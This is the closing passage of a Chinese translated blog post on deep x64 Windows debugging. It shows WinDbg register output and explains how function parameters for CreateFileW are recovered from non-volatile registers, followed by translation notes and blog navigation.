ptr [rsp+180h]</div></pre></td></tr></table></figure>
<p>在栈帧#2上运行命令<code>.frame /r</code>，可以发现函数CreateFileWImplementation()栈帧上的非易失性寄存器的值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">0:000&gt; .frame /r 02</div><div class="line">02 00000000`0029bd60 000007fe`fe5b9ebd kernel32!CreateFileWImplementation+0x7d</div><div class="line">rax=0000000000000005 rbx=0000000080000000 rcx=000000000029bc78</div><div class="line">rdx=0000000080100080 rsi=0000000000000000 rdi=000000000029beb0</div><div class="line">rip=0000000077ac2aad rsp=000000000029bd60 rbp=0000000000000005</div><div class="line"> r8=000000000029bcc8  r9=000000000029bc88 r10=0057005c003a0043</div><div class="line">r11=00000000003ab0d8 r12=0000000000000000 r13=ffffffffb6011c12</div><div class="line">r14=0000000000000000 r15=0000000000000000</div><div class="line">iopl=0         nv up ei pl zr na po nc</div><div class="line">cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000244</div><div class="line">kernel32!CreateFileWImplementation+0x7d:</div><div class="line">00000000`77ac2aad mov     rbx,qword ptr [rsp+60h] ss:00000000`0029bdc0=&#123;usp10!UspFreeForUniStore (000007fe`fe55d8a0)&#125;</div></pre></td></tr></table></figure>
<p>观察相应的mov指令可以看到非易失性寄存器与参数之间的关系，如下：</p>
<ul>
<li>P1 = RCX = RDI = 000000000029beb0</li>
<li>P2 = EDX = EBX = 0000000080000000</li>
<li>P3 = R8D = EBP = 0000000000000005</li>
<li>P4 = R9 = RSI = 0000000000000000</li>
</ul>
<p>使用上面的技能找回x64调用栈上的参数的时候，可能会比较耗时和麻烦。CodeMachine提供了一个windbg extension，可以自动完成上述的过程，找回参数，有兴趣可以继续阅读相关的文章。<br><a href="http://www.codemachine.com/tool_cmkd.html#stack" target="_blank" rel="external">http://www.codemachine.com/tool_cmkd.html#stack</a></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>感谢网友ghostway提出的翻译宝贵意见！</p>
<ul>
<li>Non-Volatile Register：之前翻译为“不可变寄存器”，现修改为“非易失性寄存器”</li>
<li>Homing Space 中，“如果参数是传址而不是传值”, 比较拗口，现修改为“如果函数是通过地址访问参数”。</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://michaelpdu.github.io/2015/06/25/x64deepdive/" data-id="cizl5jcjo0002mszz7qj7d702" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/翻译/">翻译</a></li></ul>

    </footer>
  </div>
  
</article>


  

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/flash/">flash</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/样本分析/">样本分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/翻译/">翻译</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/flash/" style="font-size: 10px;">flash</a> <a href="/tags/样本分析/" style="font-size: 10px;">样本分析</a> <a href="/tags/翻译/" style="font-size: 10px;">翻译</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">一月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">八月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2017/01/26/CVE-2016-7200-CVE-2016-7201-Edge/">CVE-2016-7200 &amp; CVE-2016-7201 (Edge)</a>
          </li>
        
          <li>
            <a href="/2017/01/13/begin-github-blog/">开始使用GitHub写blog</a>
          </li>
        
          <li>
            <a href="/2016/08/31/thinking-of-embedded-flash-dump-in-flash-player/">利用flash player脱壳的思路</a>
          </li>
        
          <li>
            <a href="/2015/06/25/x64deepdive/">深入Windows X64调试</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2017 Michael Du<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>